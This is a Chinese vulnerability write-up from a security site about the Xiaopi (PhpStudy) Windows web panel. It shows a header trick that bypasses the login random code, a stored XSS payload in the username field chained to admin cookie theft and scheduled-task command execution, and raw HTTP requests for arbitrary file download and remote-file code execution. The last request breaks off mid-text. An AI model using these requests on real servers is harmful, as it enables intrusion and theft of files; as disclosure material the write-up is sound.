---
title: 小皮 Windows web 面板 漏洞详解
url: https://www.secpulse.com/archives/198259.html
source: 安全脉搏
date: 2023-03-29
fetch_date: 2025-10-04T10:58:30.245634
---

# 小皮 Windows web 面板 漏洞详解

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 小皮 Windows web 面板 漏洞详解

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-03-28

9,998

## 漏洞简介

　　PhpStudy国内12年老牌公益软件，集安全、高效、功能与一体，已获得全球用户认可安装，运维也高效。 支持一键LAMP、LNMP、集群、监控、网站、数据库、FTP、软件中心、伪静态、云备份、SSL、多版本共存、Nginx反向代理、服务器防火墙、web防火墙、监控大屏等100多项服务器管理功能。小皮 Windows web 面板存在存储型 xss 漏洞，结合后台计划任务即可实现 RCE。

## 影响版本

| 操作系统 | 影响版本 |
| --- | --- |
| Windows | V0.102 及其以下的版本 |
| Liunx | V1.11 及其以下的版本 |

　　因为我一边测试一边写文章，但是我发现下载下的新版本的已经添加了过滤，但是并没有更新日志。

## 环境搭建

　　从官网下载 小皮 windows 面板安装包

　　https://www.xp.cn/windows-panel.html

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969613.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969614.png "null")

　　安装完成后会有一个初始信息文本，记录了小皮面板的登录地址以及账号密码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969615.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969616.png "null")

## 漏洞复现

### 绕过随机码

　　我们注意到小皮面板后台默认开放在 9080 端口，后台登录 url 地址中会存在一个随机码，不添加随机码时返回信息为 404。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969617.png "null")

　　在程序中全局搜索和 404 相关的字样定位到 `service/httpServer/Workerman/WebServer.php`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969618.png "null")

　　当添加请求头 X-Requested-With: XMLHttpRequest 就可以绕过随机码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969623.png "null")

　　‍

### 存储型 XSS

　　我们在用户登录处的用户名插入弹窗 XSS 代码 验证是否存在漏洞

```
<script>alert("xss")</script>
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969625.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969626.png "null")

　　利用正确的用户名密码登录查看

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969627.png "null")

　　我们发现成功的触发了存储型 xss

　　我们查看登录时的数据包

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969628.png "null")

`service/app/account.php`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969629.png "null")

`Account::login`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969630.png "null")

`Socket::request`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969633.png "null")

　　‍

　　将信息保存起来，登录平台后会自动获取一次日志信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969634.png "null")

`service/app/log.php`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969636.png "null")

　　‍

### 后台计划任务

　　我们注意到后台有计划任务模块

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969637.png "null")

　　所以可以直接通过构造计划任务实现 RCE

　　添加任务 -> 添加 shell 脚本 -> 构造 shell 脚本内容 -> 执行 shell 脚本

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969638.png "null")

　　‍

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969639.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969640.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969641.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969645.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969647.png "null")

　　成功执行命令

　　结合原本的存储型 XSS，可以直接获取管理员的 Cookie 值然后实现后台计划任务命令执行，或者直接通过 js 文件实现类似 CSRF + 后台计划任务命令执行。

### 任意文件下载

　　构造数据包

```
GET /service/app/files.php?type=download&file=L3Rlc3QudHh0 HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
```

　　file 的值是 base64 编码后的 /test.txt 成功读取文件内容

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969650.png "null")

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969651.png "null")

　　service/app/files.php

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-198259-1679969652.png "null")

　　文件下载通过 get 获取文件名，通过 base64 解码获取，没有校验，所以可以实现任意文件下载

### 任意代码执行

　　构造数据包

```
POST /service/app/files.php?type=download_remote_file HTTP/1.1
Host: 192.168.222.139:9080
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://192.168.222.139:9080/C292CA
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=9c53f8f8c903d9412a3f0211
Connection: close
Content-Type...